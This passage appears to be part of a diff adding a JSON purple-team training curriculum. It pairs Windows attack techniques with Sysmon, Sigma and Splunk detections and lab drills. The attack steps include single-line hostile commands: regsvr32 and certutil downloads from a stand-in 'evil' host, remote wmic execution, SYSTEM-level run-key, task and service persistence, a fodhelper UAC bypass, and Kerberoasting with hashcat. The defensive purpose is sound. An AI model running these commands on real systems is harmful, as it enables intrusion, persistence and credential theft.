+            "GTFOBins and LOLBAS project catalog 100+ abusable binaries and their attack patterns",
+            "regsvr32 /s /u /i:http://evil.sct scrobj.dll (squiblydoo) bypasses application whitelisting",
+            "mshta can execute inline VBScript/JavaScript from a URL without writing to disk",
+            "certutil.exe can download files: certutil -urlcache -split -f http://evil/payload.exe file.exe"
+          ],
+          "attack_side": {
+            "technique": "Use LOLBins to execute payloads while evading application whitelisting and blending with legitimate activity",
+            "attack_steps": [
+              "Identify available LOLBins that arent blocked by AppLocker/WDAC",
+              "Use mshta to execute inline HTA with VBScript payload from URL",
+              "Use rundll32 to execute malicious DLL or JavaScript via advpack.dll",
+              "Use certutil or bitsadmin to download second-stage payload",
+              "Chain LOLBins: cmd > certutil (download) > rundll32 (execute) for stealth"
+            ],
+            "tools": [
+              "mshta.exe",
+              "rundll32.exe",
+              "regsvr32.exe",
+              "certutil.exe",
+              "msbuild.exe",
+              "wmic.exe",
+              "installutil.exe"
+            ],
+            "attack_techniques": [
+              "T1218.005",
+              "T1218.011",
+              "T1218.010",
+              "T1218.001",
+              "T1047"
+            ],
+            "killchain_stage": "execution"
+          },
+          "defense_side": {
+            "what_to_detect": "Detect LOLBins executing with suspicious arguments unusual parent processes or making network connections",
+            "logs": [
+              "Sysmon Event 1 (Process Creation) with command line",
+              "Sysmon Event 3 (Network Connection) from LOLBin processes",
+              "Sysmon Event 7 (Image Loaded) \u2014 DLLs loaded by LOLBins",
+              "Sysmon Event 22 (DNS Query) from LOLBin processes",
+              "Windows Security Event 4688 with command line logging"
+            ],
+            "detection_rules": [
+              "Sigma: proc_creation_win_mshta_execution \u2014 mshta.exe with URL or inline script arguments",
+              "Sigma: proc_creation_win_certutil_download \u2014 certutil.exe with -urlcache or -decode flags",
+              "Sigma: proc_creation_win_regsvr32_squiblydoo \u2014 regsvr32 with /s /u /i:http patterns",
+              "Sigma: proc_creation_win_lolbin_with_network \u2014 any LOLBin making unexpected network connections"
+            ],
+            "tools": [
+              "Sysmon",
+              "EDR",
+              "Splunk/Elastic SIEM",
+              "Windows Defender ASR Rules",
+              "AppLocker/WDAC"
+            ],
+            "controls": [
+              "Application Whitelisting (AppLocker/WDAC)",
+              "ASR Rules (block Office apps from creating child processes)",
+              "EDR behavioral monitoring"
+            ]
+          },
+          "gap_analysis": "LOLBins are legitimate tools so blocking them entirely breaks administration. Detection must focus on arguments and parent-child relationships not just the binary name. Gap: many orgs dont enable Sysmon command-line logging (Event 1 with CommandLine field) or Windows 4688 command-line auditing.",
+          "drills": [
+            "Execute 5 LOLBin techniques (squiblydoo mshta inline certutil download rundll32 advpack wmic process call). For each identify which Sysmon events fire. Write Sigma rules for each pattern. Measure false positive rate against a week of production data."
+          ],
+          "common_mistakes": [
+            "Alerting on every LOLBin execution (too noisy) \u2014 must filter by arguments and parent process",
+            "Not correlating LOLBin network connections with process creation for full context",
+            "Forgetting that LOLBins work from any process context not just initial access"
+          ]
+        },
+        {
+          "id": "wmi-vs-wmi-monitoring",
+          "title": "WMI Execution & Persistence (T1047 T1546.003) vs. WMI Monitoring",
+          "concepts": [
+            "Windows Management Instrumentation (WMI): powerful management interface used for remote execution and persistence",
+            "WMI event subscriptions: __EventFilter + __EventConsumer + __FilterToConsumerBinding = permanent persistence",
+            "Attackers use wmic.exe or direct WMI API calls for lateral movement execution and stealth persistence",
+            "WMI persistence survives reboots and doesnt appear in common autoruns locations (registry run keys startup folder)",
+            "WMI consumers can be CommandLineEventConsumer (run any command) or ActiveScriptEventConsumer (run VBScript/JScript)"
+          ],
+          "key_facts": [
+            "WMI permanent event subscriptions are stored in the CIM repository (C:\\Windows\\System32\\wbem\\Repository)",
+            "wmic process call create cmd.exe /c payload executes on local or remote systems",
+            "WMI persistence is invisible to Sysinternals Autoruns unless you check the WMI tab",
+            "WMI event subscriptions can be triggered by timed events process creation or log events"
+          ],
+          "attack_side": {
+            "technique": "Use WMI for remote execution lateral movement and permanent persistence via event subscriptions",
+            "attack_steps": [
+              "Remote execution: wmic /node:TARGET process call create powershell -enc payload",
+              "Persistence: create __EventFilter (trigger on specific event or timer)",
+              "Create CommandLineEventConsumer (command to execute)",
+              "Create __FilterToConsumerBinding (link filter to consumer)",
+              "Persistence triggers automatically on system events surviving reboots"
+            ],
+            "tools": [
+              "wmic.exe",
+              "PowerShell WMI cmdlets (New-CimInstance)",
+              "SharpWMI",
+              "wmimplant"
+            ],
+            "attack_techniques": [
+              "T1047",
+              "T1546.003",
+              "T1021.006",
+              "T1059.001"
+            ],
+            "killchain_stage": "execution"
+          },
+          "defense_side": {
+            "what_to_detect": "Detect WMI permanent event subscription creation and suspicious wmic.exe usage",
+            "logs": [
+              "Sysmon Event 19 (WmiEventFilter) Event 20 (WmiEventConsumer) Event 21 (WmiEventConsumerToFilter)",
+              "Sysmon Event 1 (wmic.exe process creation with command line)",
+              "Windows Security Event 4648 (explicit credentials logon) for WMI remote connections",
+              "Microsoft-Windows-WMI-Activity/Operational log"
+            ],
+            "detection_rules": [
+              "Sigma: wmi_pers \u2014 Sysmon Events 19/20/21 for WMI permanent event subscriptions",
+              "Sigma: proc_creation_win_wmic_process_creation \u2014 wmic process call create with suspicious arguments",
+              "Baseline WMI subscriptions: query root\\subscription for EventFilter EventConsumer FilterToConsumerBinding objects"
+            ],
+            "tools": [
+              "Sysmon (with WMI event providers)",
+              "WMI Explorer",
+              "Autoruns (WMI tab)",
+              "Kansa (PowerShell IR framework)"
+            ],
+            "controls": [
+              "Sysmon WMI monitoring (Events 19-21)",
+              "WMI namespace security hardening",
+              "Network segmentation (block DCOM/WMI port 135)"
+            ]
+          },
+          "gap_analysis": "WMI persistence is frequently missed because its not in registry autorun locations. Many organizations dont deploy Sysmon with WMI event monitoring enabled. Gap: WMI events require specific Sysmon configuration \u2014 the default SwiftOnSecurity config includes them but many custom configs omit them.",
+          "drills": [
+            "Create a WMI permanent event subscription for persistence. Verify it survives reboot. Then hunt for it using Sysmon Events 19/20/21 and manual WMI namespace queries. Write a detection and validate it fires on subscription creation."
+          ],
+          "common_mistakes": [
+            "Not including WMI event monitoring in Sysmon configuration",
+            "Forgetting to check WMI during threat hunting and IR",
+            "Thinking Autoruns catches all persistence \u2014 it has a WMI tab but many hunters skip it"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "persistence-pairings",
+      "title": "Persistence \u2014 Autostart Execution vs. Registry & Service Monitoring",
+      "difficulty": "intermediate",
+      "prerequisites": [
+        "execution-pairings"
+      ],
+      "objective": "Learner can establish persistence using common techniques and deploy detections that catch them via Sysmon, Autoruns, and behavioral monitoring.",
+      "topics": [
+        {
+          "id": "registry-run-keys-vs-sysmon-registry",
+          "title": "Registry Run Keys (T1547.001) vs. Sysmon Registry Monitoring",
+          "concepts": [
+            "Registry Run keys: HKLM/HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run \u2014 programs that execute at logon",
+            "Additional persistence locations: RunOnce RunServices Winlogon\\Shell Winlogon\\Userinit Explorer\\Run",
+            "Startup folder: %AppData%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup \u2014 files execute at logon",
+            "Sysmon registry events: Event 12 (Registry create/delete) Event 13 (Registry value set) Event 14 (Registry rename)",
+            "Autoruns: Sysinternals tool that catalogs all autostart locations for baseline and hunting"
+          ],
+          "key_facts": [
+            "Registry Run keys are the #1 most common persistence technique in ATT&CK (T1547.001)",
+            "Sysmon Event 13 fires when a registry value is SET \u2014 this is the key event for run key detection",
+            "Autoruns categorizes 100+ autostart extensibility points (ASEPs) across the system",
+            "Run keys in HKLM execute for ALL users; HKCU execute only for the specific user"
+          ],
+          "attack_side": {
+            "technique": "Add a program to registry Run keys or startup folder to execute automatically at next logon",
+            "attack_steps": [
+              "Identify target executable (beacon payload backdoor scheduled task creator)",
+              "Add registry value: reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Update /t REG_SZ /d C:\\Users\\Public\\payload.exe",
+              "Alternative: use reg.exe PowerShell Set-ItemProperty or direct Win32 API calls",
+              "Payload executes at next user logon with user privileges"
+            ],
+            "tools": [
+              "reg.exe",
+              "regini.exe",
+              "PowerShell (Set-ItemProperty)",
+              "SharPersist"
+            ],
+            "attack_techniques": [
+              "T1547.001",
+              "T1060",
+              "T1112"
+            ],
+            "killchain_stage": "persistence"
+          },
+          "defense_side": {
+            "what_to_detect": "Detect modifications to registry persistence locations using Sysmon registry monitoring (Events 12/13/14)",
+            "logs": [
+              "Sysmon Event 13 (Registry Value Set) \u2014 filter TargetObject for *\\Run\\* *\\RunOnce\\* *\\Winlogon\\*",
+              "Sysmon Event 12 (Registry Key Create) \u2014 new registry keys in autostart locations",
+              "Windows Security Event 4657 (Registry Value Modified) \u2014 if registry auditing is enabled",
+              "Sysmon Event 1 (Process Creation) at logon \u2014 programs started by explorer.exe or userinit.exe"
+            ],
+            "detection_rules": [
+              "Sigma: registry_event_run_key_persistence \u2014 Sysmon Event 13 targeting Run/RunOnce keys",
+              "Sigma: registry_event_winlogon_helper \u2014 modifications to Winlogon Shell/Userinit values",
+              "Splunk: index=sysmon EventCode=13 TargetObject=*\\CurrentVersion\\Run\\* | stats by Computer Image TargetObject Details",
+              "Baseline: compare Autoruns output against known-good baseline to detect new autostart entries"
+            ],
+            "tools": [
+              "Sysmon (registry monitoring)",
+              "Sysinternals Autoruns",
+              "Sysinternals AutorunsC (command-line)",
+              "EDR",
+              "Velociraptor"
+            ],
+            "controls": [
+              "Sysmon registry monitoring",
+              "Privilege management (HKLM requires admin)",
+              "Application whitelisting"
+            ]
+          },
+          "gap_analysis": "Some persistence locations are not covered by default Sysmon registry filters. Non-standard startup registry keys may evade Autoruns. Gap: many orgs dont baseline their autostart entries making it impossible to detect new additions.",
+          "drills": [
+            "Plant persistence in 5 locations (HKLM Run HKCU Run Startup folder Winlogon Userinit RunOnce). For each verify Sysmon Event 13 fires. Then use Autoruns to find all 5. Write a Sigma rule covering all locations."
+          ],
+          "common_mistakes": [
+            "Only monitoring HKLM Run and forgetting HKCU Run or less-common locations",
+            "Not establishing an Autoruns baseline for comparison",
+            "Alerting on every registry change (too noisy) \u2014 must filter for persistence-specific paths"
+          ]
+        },
+        {
+          "id": "scheduled-tasks-vs-task-monitoring",
+          "title": "Scheduled Tasks (T1053.005) vs. Task Scheduler Monitoring",
+          "concepts": [
+            "Scheduled tasks: Windows Task Scheduler programs that run on triggers (time logon event idle)",
+            "Attackers create scheduled tasks for persistence privilege escalation and execution timing",
+            "schtasks.exe or COM ITaskService can create tasks; tasks can run as SYSTEM for privilege escalation",
+            "Task XML is stored in C:\\Windows\\System32\\Tasks\\ and C:\\Windows\\Tasks\\",
+            "Detection: monitor for new task creation especially by non-standard processes or with suspicious actions"
+          ],
+          "key_facts": [
+            "Scheduled tasks can run with highest privileges (SYSTEM) if created by an admin",
+            "schtasks /create /tn TaskName /tr payload.exe /sc ONLOGON /ru SYSTEM",
+            "Task Scheduler logs are in Microsoft-Windows-TaskScheduler/Operational (Event 106 = task registered)",
+            "Sysmon can monitor for schtasks.exe creation (Event 1) with suspicious arguments"
+          ],
+          "attack_side": {
+            "technique": "Create a scheduled task that executes a malicious payload on a trigger (logon startup or recurring)",
+            "attack_steps": [
+              "Create task with schtasks: schtasks /create /tn Updater /tr powershell -enc payload /sc ONLOGON /ru SYSTEM /rl HIGHEST",
+              "Alternative: use COM objects (Schedule.Service) for stealthier task creation",
+              "Task survives reboot and executes payload with SYSTEM privileges",
+              "Can also modify existing legitimate tasks to add malicious actions"
+            ],
+            "tools": [
+              "schtasks.exe",
+              "PowerShell ScheduledTasks module",
+              "COM ITaskService",
+              "Cobalt Strike",
+              "SharPersist"
+            ],
+            "attack_techniques": [
+              "T1053.005",
+              "T1053",
+              "T1548"
+            ],
+            "killchain_stage": "persistence"
+          },
+          "defense_side": {
+            "what_to_detect": "Detect creation of new scheduled tasks especially with SYSTEM privileges suspicious actions or by unexpected processes",
+            "logs": [
+              "Microsoft-Windows-TaskScheduler/Operational Event 106 (Task Registered)",
+              "Sysmon Event 1 (schtasks.exe process creation with /create arguments)",
+              "Windows Security Event 4698 (A scheduled task was created)",
+              "Sysmon Event 11 (file creation in C:\\Windows\\System32\\Tasks\\)"
+            ],
+            "detection_rules": [
+              "Sigma: proc_creation_win_schtasks_persistence \u2014 schtasks /create with ONLOGON ONSTART or SYSTEM user",
+              "Sigma: proc_creation_win_schtasks_system \u2014 scheduled task running as SYSTEM created by non-standard process",
+              "Splunk: index=windows sourcetype=WinEventLog:Microsoft-Windows-TaskScheduler/Operational EventCode=106"
+            ],
+            "tools": [
+              "Sysmon",
+              "EDR",
+              "Windows Task Scheduler audit logging",
+              "Splunk Task Scheduler TA"
+            ],
+            "controls": [
+              "Task Scheduler auditing (Event 4698)",
+              "Privilege management",
+              "Application whitelisting"
+            ]
+          },
+          "gap_analysis": "Task Scheduler auditing (Event 4698) requires enabling Advanced Audit Policy. Many orgs dont enable the TaskScheduler/Operational log channel. Gap: attackers can modify existing tasks actions to add malicious steps which may not generate a task created event.",
+          "drills": [
+            "Create a scheduled task for persistence running as SYSTEM. Verify detection via Task Scheduler Event 106 and Sysmon Event 1. Then modify an existing benign task to add a malicious action \u2014 does your detection catch the modification?"
+          ],
+          "common_mistakes": [
+            "Only alerting on schtasks.exe and missing COM-based task creation",
+            "Not monitoring for task modifications (only new creation)",
+            "Forgetting that tasks can be created on remote systems via AT service or WMI"
+          ]
+        },
+        {
+          "id": "windows-services-vs-service-monitoring",
+          "title": "Windows Services (T1543.003) vs. Service Monitoring",
+          "concepts": [
+            "Windows services run in the background can start at boot and often run as SYSTEM",
+            "Attackers create malicious services or modify existing ones for persistence and privilege escalation",
+            "Service path: sc.exe create New-Service PowerShell or direct registry modification of HKLM\\SYSTEM\\CurrentControlSet\\Services",
+            "Unquoted service path vulnerability: if service path has spaces and isnt quoted attacker can plant executables",
+            "Detection: monitor for service creation especially with suspicious binary paths or run as SYSTEM"
+          ],
+          "key_facts": [
+            "Services can be configured as auto-start (boot) and run as LocalSystem for full privilege",
+            "sc.exe create ServiceName binPath= C:\\path\\payload.exe start= auto",
+            "Windows Security Event 7045 (Service Installed) fires when a new service is created",
+            "Sysmon Event 6 (Driver Load) and Event 1 can detect service binary execution"
+          ],
+          "attack_side": {
+            "technique": "Create a Windows service to achieve persistence and SYSTEM-level execution",
+            "attack_steps": [
+              "Create service: sc create WindowsUpdateSvc binPath= C:\\Users\\Public\\beacon.exe start= auto",
+              "Configure as SYSTEM: sc config WindowsUpdateSvc obj= LocalSystem",
+              "Start service: sc start WindowsUpdateSvc",
+              "Service runs at boot with SYSTEM privileges providing persistent access"
+            ],
+            "tools": [
+              "sc.exe",
+              "New-Service (PowerShell)",
+              "reg.exe (direct registry modification)",
+              "Cobalt Strike",
+              "PowerUp"
+            ],
+            "attack_techniques": [
+              "T1543.003",
+              "T1050",
+              "T1574.011"
+            ],
+            "killchain_stage": "persistence"
+          },
+          "defense_side": {
+            "what_to_detect": "Detect new service creation especially with suspicious binary paths or service names mimicking legitimate services",
+            "logs": [
+              "Windows Security Event 7045 (Service Installed / A service was installed in the system)",
+              "Sysmon Event 1 (sc.exe or powershell.exe creating service with suspicious arguments)",
+              "Windows System Event 7034/7036 (service stopped/started)",
+              "Sysmon Event 11 (new service binary file creation)"
+            ],
+            "detection_rules": [
+              "Sigma: proc_creation_win_new_service_creation \u2014 sc.exe create or New-Service with suspicious paths",
+              "Sigma: win_system_service_creation \u2014 Windows Event 7045 with non-standard service binary path",
+              "Splunk: index=windows EventCode=7045 | where NOT match(ServiceFileName (?i)(System32|Program Files))"
+            ],
+            "tools": [
+              "Sysmon",
+              "EDR",
+              "Windows Event Log (System log for 7045)",
+              "Splunk Windows TA"
+            ],
+            "controls": [
+              "Service creation auditing (Event 7045)",
+              "Privilege management (service creation requires admin)",
+              "Application whitelisting"
+            ]
+          },
+          "gap_analysis": "Event 7045 only fires for services created via the SCM API. Direct registry modification of the Services key wont generate 7045 \u2014 requires registry monitoring. Gap: attackers who modify existing service binaries or hijack service DLL paths can evade service-creation detection.",
+          "drills": [
+            "Create a malicious Windows service. Verify Event 7045 fires. Then try creating a service via direct registry modification \u2014 does your detection catch it? Write detections for both methods."
+          ],
+          "common_mistakes": [
+            "Only monitoring for new services not modified ones",
+            "Not checking service binary paths against allowlists",
+            "Forgetting to correlate service creation with the creating process for attribution"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "privilege-escalation-pairings",
+      "title": "Privilege Escalation \u2014 Token Manipulation & UAC Bypass vs. Privilege Monitoring",
+      "difficulty": "advanced",
+      "prerequisites": [
+        "persistence-pairings"
+      ],
+      "objective": "Learner can execute privilege escalation techniques and build detections using Windows privilege audit events and process monitoring.",
+      "topics": [
+        {
+          "id": "access-token-manipulation-vs-privilege-monitoring",
+          "title": "Access Token Manipulation (T1134) vs. Privilege Usage Monitoring",
+          "concepts": [
+            "Windows access tokens: security context objects containing user SID group memberships and privileges",
+            "Token manipulation sub-techniques: Token Impersonation/Theft (T1134.001) Create Process with Token (T1134.002) Make and Impersonate (T1134.003) Parent PID Spoofing (T1134.004) SID-History Injection (T1134.005)",
+            "Attackers steal tokens from SYSTEM or admin processes to escalate privileges",
+            "Key privileges: SeDebugPrivilege (access any process) SeAssignPrimaryTokenPrivilege SeImpersonatePrivilege",
+            "JuicyPotato/RoguePotato/PrintSpoofer exploit SeImpersonatePrivilege to escalate from service account to SYSTEM"
+          ],
+          "key_facts": [
+            "SeDebugPrivilege allows a process to open any other process (including SYSTEM processes) for full access",
+            "Windows Event 4672 (Special Privileges Assigned to New Logon) fires when admin/elevated privileges are granted",
+            "Windows Event 4703 (Token Right Adjusted) fires when a privilege is enabled \u2014 key for SeDebugPrivilege detection",
+            "Windows Event 4688 with Elevated Token field = Yes indicates the process ran elevated"
+          ],
+          "attack_side": {
+            "technique": "Manipulate Windows access tokens to escalate from standard user to SYSTEM or domain admin",
+            "attack_steps": [
+              "Obtain SeImpersonatePrivilege (common with service accounts like IIS SQL WinRM)",
+              "Exploit with PrintSpoofer or RoguePotato to get SYSTEM token",
+              "Steal token: OpenProcessToken on target process (lsass.exe or winlogon.exe for SYSTEM)",
+              "Create process with stolen token: CreateProcessWithTokenW or CreateProcessAsUserW",
+              "Result: new process running as SYSTEM or target user"
+            ],
+            "tools": [
+              "Incognito",
+              "Tokenvator",
+              "Mimikatz (token::elevate)",
+              "PrintSpoofer",
+              "RoguePotato",
+              "JuicyPotato",
+              "Cobalt Strike (steal_token)"
+            ],
+            "attack_techniques": [
+              "T1134.001",
+              "T1134.002",
+              "T1134.003",
+              "T1134.004"
+            ],
+            "killchain_stage": "privilege-escalation"
+          },
+          "defense_side": {
+            "what_to_detect": "Detect privilege enabling (SeDebugPrivilege) token theft (opening other processes tokens) and process creation with elevated/impersonated tokens",
+            "logs": [
+              "Windows Security Event 4703 (Token Right Adjusted Events \u2014 privilege enabled)",
+              "Windows Security Event 4672 (Special Privileges Assigned to New Logon)",
+              "Sysmon Event 10 (Process Access) \u2014 suspicious handle requests to lsass.exe or winlogon.exe",
+              "Windows Security Event 4688 with Elevated=Yes flag",
+              "Sysmon Event 1 (process creation) with unusual user context vs parent"
+            ],
+            "detection_rules": [
+              "Sigma: win_privilege_escalation_sedebugprivilege \u2014 Event 4703 with SeDebugPrivilege enabled by non-system process",
+              "Splunk: index=windows EventCode=4703 PrivilegeList=SeDebugPrivilege | where NOT match(Image (?i)(svchost|csrss|MsMpEng))",
+              "Sigma: win_token_manipulation \u2014 Event 4688 where SubjectUserName differs from expected for parent process lineage"
+            ],
+            "tools": [
+              "Windows Advanced Audit Policy (Privilege Use > Audit Sensitive Privilege Use)",
+              "Sysmon",
+              "EDR with process lineage tracking",
+              "Microsoft Defender for Identity"
+            ],
+            "controls": [
+              "Least privilege (dont grant SeImpersonatePrivilege to service accounts)",
+              "Windows Defender Credential Guard",
+              "PPL (Protected Process Light) for lsass.exe",
+              "Privilege monitoring (Event 4703)"
+            ]
+          },
+          "gap_analysis": "Event 4703 generates high volume \u2014 many legitimate processes enable privileges. Must filter to SeDebugPrivilege specifically and exclude known-good processes. Gap: Parent PID Spoofing (T1134.004) is very hard to detect as the spoofed parent looks legitimate. Token impersonation via API calls doesnt always generate obvious log events.",
+          "drills": [
+            "Use PrintSpoofer to escalate from a service account to SYSTEM. Check: did Event 4703 fire for SeDebugPrivilege? Did Sysmon Event 10 fire for process access? Write a detection combining 4703 + process lineage anomaly."
+          ],
+          "common_mistakes": [
+            "Not enabling Audit Sensitive Privilege Use (needed for Event 4703)",
+            "Alerting on all privilege usage (too noisy) \u2014 focus on SeDebugPrivilege and SeAssignPrimaryTokenPrivilege",
+            "Not correlating privilege events with process creation events for context"
+          ]
+        },
+        {
+          "id": "uac-bypass-vs-elevation-monitoring",
+          "title": "UAC Bypass (T1548.002) vs. Elevation Monitoring",
+          "concepts": [
+            "User Account Control (UAC): Windows feature requiring elevation consent for admin actions",
+            "UAC bypass: techniques that allow a process running in medium IL (with admin token available) to execute in high IL without consent prompt",
+            "Common UAC bypass methods: auto-elevate binaries (fodhelper computerdefaults sdclt) COM hijacking DLL side-loading ICMLuaUtil",
+            "UAC bypass requires the user to already be in the local Administrators group",
+            "Detection: monitor for auto-elevate binaries executing with unexpected command lines or loading unsigned DLLs"
+          ],
+          "key_facts": [
+            "UAC bypass is only relevant when the user is a local admin \u2014 standard users cant bypass (they need credentials)",
+            "fodhelper.exe auto-elevates and reads registry keys that can be hijacked to execute arbitrary commands",
+            "UAC bypass techniques change with each Windows update \u2014 maintain a current list (UACME project has 100+ methods)",
+            "Sysmon Event 1 can detect auto-elevate binaries spawning unexpected child processes"
+          ],
+          "attack_side": {
+            "technique": "Bypass UAC consent prompt to execute code with elevated privileges using auto-elevate binaries",
+            "attack_steps": [
+              "Verify current user is in local Administrators group (UAC bypass prerequisite)",
+              "Select UAC bypass method (e.g., fodhelper registry hijack)",
+              "Set registry key: HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command = cmd.exe",
+              "Launch fodhelper.exe (auto-elevates) which reads the registry and executes the command elevated",
+              "New process runs in high integrity level without UAC prompt"
+            ],
+            "tools": [
+              "UACME (100+ methods)",
+              "fodhelper bypass",
+              "DLL side-loading techniques",
+              "Cobalt Strike (bypassuac command)",
+              "PowerUp"
+            ],
+            "attack_techniques": [
+              "T1548.002",
+              "T1088",
+              "T1574",
+              "T1546"
+            ],
+            "killchain_stage": "privilege-escalation"
+          },
+          "defense_side": {
+            "what_to_detect": "Detect auto-elevate binaries (fodhelper sdclt computerdefaults) spawning unexpected child processes or loading unsigned DLLs",
+            "logs": [
+              "Sysmon Event 1 (Process Creation) \u2014 monitor for fodhelper.exe sdclt.exe computerdefaults.exe spawning cmd/powershell",
+              "Sysmon Event 7 (Image Loaded) \u2014 unsigned DLLs loaded by auto-elevate binaries",
+              "Sysmon Event 13 (Registry Value Set) \u2014 modifications to HKCU\\Software\\Classes\\ keys used in bypass",
+              "Windows Security Event 4688 with Elevated Token field"
+            ],
+            "detection_rules": [
+              "Sigma: proc_creation_win_uac_bypass_fodhelper \u2014 fodhelper.exe spawning cmd.exe or powershell.exe",
+              "Sigma: proc_creation_win_uac_bypass_sdclt \u2014 sdclt.exe spawning unexpected child processes",
+              "Sigma: registry_event_uac_bypass \u2014 registry modifications to HKCU\\Software\\Classes\\ms-settings or similar"
+            ],
+            "tools": [
+              "Sysmon",
+              "EDR",
+              "UACME test suite",
+              "Windows Event Log"
+            ],
+            "controls": [
+              "UAC set to Always Notify (highest level)",
+              "Monitor auto-elevate binary behavior",
+              "Application whitelisting (WDAC)"
+            ]
+          },
+          "gap_analysis": "Setting UAC to Always Notify prevents many bypass methods but is disruptive. New bypass methods are discovered regularly (UACME project). Gap: many organizations run UAC at default level which allows auto-elevate bypasses. Detection must focus on auto-elevate binary child process anomalies.",
+          "drills": [
+            "Execute 3 different UAC bypass methods from UACME. For each verify Sysmon Event 1 captures the auto-elevate binary to child process chain. Write Sigma rules. Then set UAC to Always Notify and confirm the bypasses are blocked."
+          ],
+          "common_mistakes": [
+            "Thinking UAC is a security boundary \u2014 its a convenience feature and bypassable for admin users",
+            "Not monitoring auto-elevate binary behavior specifically",
+            "Forgetting that UAC bypass is irrelevant for non-admin users"
+          ]
+        },
+        {
+          "id": "kerberoasting-vs-detection",
+          "title": "Kerberoasting (T1558.003) vs. Kerberos Request Monitoring",
+          "concepts": [
+            "Kerberoasting: request Kerberos service tickets (TGS) for service accounts then crack them offline to recover passwords",
+            "Any authenticated domain user can request TGS tickets for any SPN-registered service \u2014 this is legitimate Kerberos behavior",
+            "The attack: request tickets offline then crack the encrypted ticket offline (no domain interaction after initial request)",
+            "Detection challenge: ticket requests are normal Kerberos traffic \u2014 must look for volume anomalies and encryption type downgrades",
+            "Key indicator: requests for RC4-HMAC tickets (weak encryption) when AES is available"
+          ],
+          "key_facts": [
+            "Service accounts with SPNs are vulnerable \u2014 especially those with weak passwords",
+            "RC4-HMAC (encryption type 0x17 / 23) tickets are crackable with hashcat in minutes; AES-256 takes much longer",
+            "Windows Event 4769 (Kerberos Service Ticket Request) logs every TGS request including encryption type",
+            "Rubeus kerberoast can request all TGS tickets in one batch generating a spike in 4769 events"
+          ],
+          "attack_side": {
+            "technique": "Request Kerberos service tickets for all SPN-registered accounts and crack them offline to recover service account passwords",
+            "attack_steps": [
+              "Enumerate SPN-registered accounts: setspn -T domain -Q */* or PowerView Get-NetUser -SPN",
+              "Request TGS tickets: Rubeus kerberoast or Invoke-Kerberoast (requests tickets for all service accounts)",
+              "Export tickets in hashcat crackable format (Kerberos 5 etype 23)",
+              "Crack offline: hashcat -m 13100 hashes.txt wordlist (RC4-HMAC mode)",
+              "Use recovered credentials for lateral movement or privilege escalation"
+            ],
+            "tools": [
+              "Rubeus",
+              "Invoke-Kerberoast (PowerSploit)",
+              "hashcat (mode 13100)",
+              "John the Ripper",
+              "Impacket (GetUserSPNs.py)"
+            ],
+            "attack_techniques": [
+              "T1558.003",
+              "T1208",
+              "T1110.002"
+            ],
+            "killchain_stage": "credential-access"
+          },
+          "defense_side": {
+            "what_to_detect": "Detect anomalous Kerberos TGS request patterns: bulk requests RC4 encryption downgrade requests from unusual hosts",
+            "logs": [
+              "Windows Security Event 4769 (Kerberos Service Ticket Request) \u2014 with TicketEncryptionType field",
+              "Windows Security Event 4768 (Kerberos Authentication Ticket Request)",
+              "Sysmon Event 1 (process executing Kerberoasting tools)",
+              "PowerShell Event 4104 (script blocks containing Kerberoast-related patterns)"
+            ],
+            "detection_rules": [
+              "Sigma: win_kerberoasting_rc4 \u2014 Event 4769 with TicketEncryptionType=0x17 (RC4-HMAC)",
+              "Sigma: win_kerberoasting_spn_requests \u2014 multiple 4769 events for different SPNs from same source in short timeframe",
+              "Splunk: index=windows EventCode=4769 TicketEncryptionType=0x17 | stats count by ClientAddress | where count > 10",
+              "Sigma: posh_ps_kerberoasting_keywords \u2014 Event 4104 containing Kerberoast/Request-SPNTicket patterns"
+            ],
+            "tools": [
+              "Windows DC Kerberos event logging",
+              "Microsoft Defender for Identity (detects Kerberoasting)",
+              "Splunk/Elastic SIEM",
+              "Sysmon"
+            ],
+            "controls": [
+              "Strong service account passwords (25+ chars)",
+              "Group Managed Service Accounts (gMSA) with automatic rotation",
+              "Disable RC4 in favor of AES",
+              "Monitoring Event 4769 for anomalies"
+            ]
+          },
+          "gap_analysis": "Kerberoasting is hard to detect because TGS requests are normal. Volume-based detection catches bulk requests but misses targeted single requests. RC4 downgrade detection is effective only if the environment supports AES (then RC4 requests are suspicious). Gap: AES Kerberoasting (etype 18) is much harder to detect and to crack.",
+          "drills": [
+            "Run Rubeus kerberoast in lab. Examine Event 4769 \u2014 check encryption types volume source. Write a Sigma rule for RC4 downgrade + volume spike. Set up gMSA and show how it mitigates the attack."
+          ],
+          "common_mistakes": [
+            "Alerting on every 4769 event (extremely noisy) \u2014 must filter for anomalies",
+            "Not distinguishing RC4 (crackable) from AES (not practically crackable) tickets",
+            "Forgetting that AS-REP roasting (T1558.004) is a different but related attack targeting accounts with DONT_REQ_PREAUTH"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "defense-evasion-pairings",
+      "title": "Defense Evasion \u2014 Injection, AMSI Bypass & Log Clearing vs. EDR & Integrity Monitoring",
+      "difficulty": "advanced",
+      "prerequisites": [
+        "execution-pairings"
+      ],
+      "objective": "Learner can execute defense evasion techniques and build detections that catch them even when traditional logs are cleared or tampered.",
+      "topics": [
+        {
+          "id": "process-injection-vs-edr-memory-scanning",
+          "title": "Process Injection (T1055) vs. EDR Memory Scanning & Sysmon",
+          "concepts": [
+            "Process injection: executing code in the address space of another (legitimate) process to evade detection",
+            "Sub-techniques: DLL Injection (T1055.001) PE Injection (T1055.002) Thread Hijacking (T1055.003) APC Injection (T1055.004) Process Hollowing (T1055.012) Process Doppelganging (T1055.013) Extra Window Memory (T1055.011)",
+            "Classic injection chain: VirtualAllocEx then WriteProcessMemory then CreateRemoteThread",
+            "EDR memory scanning: scanning process memory regions for injected code hooks and anomalies",
+            "Sysmon Events: 8 (CreateRemoteThread) 10 (ProcessAccess) 7 (ImageLoaded) 25 (ProcessTampering)"
+          ],
+          "key_facts": [
+            "Sysmon Event 8 (CreateRemoteThread) fires when one process creates a thread in another \u2014 classic injection indicator",
+            "Sysmon Event 10 (ProcessAccess) with GrantedAccess 0x1FFFFF (PROCESS_ALL_ACCESS) or 0x143A indicates suspicious memory access",
+            "Sysmon Event 25 (ProcessTampering) fires when in-memory image differs from on-disk image (hollowing indicator) \u2014 Sysmon 13+",
+            "EDRs use API hooking (ntdll.dll hooks) and memory scanning to detect injection in real-time"
+          ],
+          "attack_side": {
